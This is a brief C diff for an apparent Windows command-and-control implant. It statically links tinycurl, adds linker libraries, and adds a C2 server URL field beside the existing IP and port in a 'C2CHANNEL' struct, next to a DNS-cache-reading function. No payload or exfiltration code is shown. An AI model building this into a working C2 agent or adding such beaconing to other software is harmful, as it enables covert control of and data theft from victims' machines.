@@ -10,7 +10,17 @@
 #include <windns.h>
 // #include <ip2string.h>
 
+#define CURL_STATICLIB
+#include "..\\..\\tinycurl\\include\\curl\\curl.h"
+
+// Libraries needed for tinycurl
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "normaliz.lib")
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "wldap32.lib")
+#pragma comment(lib, "..\\..\\tinycurl\\lib\\libcurl_a.lib")
+
 #pragma comment(lib, "dnsapi.lib")
 // #pragma comment(lib, "ntdll.lib")
 
@@ -64,6 +74,7 @@ typedef int(WINAPI *DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY);
 typedef struct C2CHANNEL {
     char* c2_server_ip;
     unsigned long c2_server_port;
+    char* c2_server_url;
 } C2CHANNEL;
 
 int get_dns_cache(char record_names[][NI_MAXHOST], int *record_count);
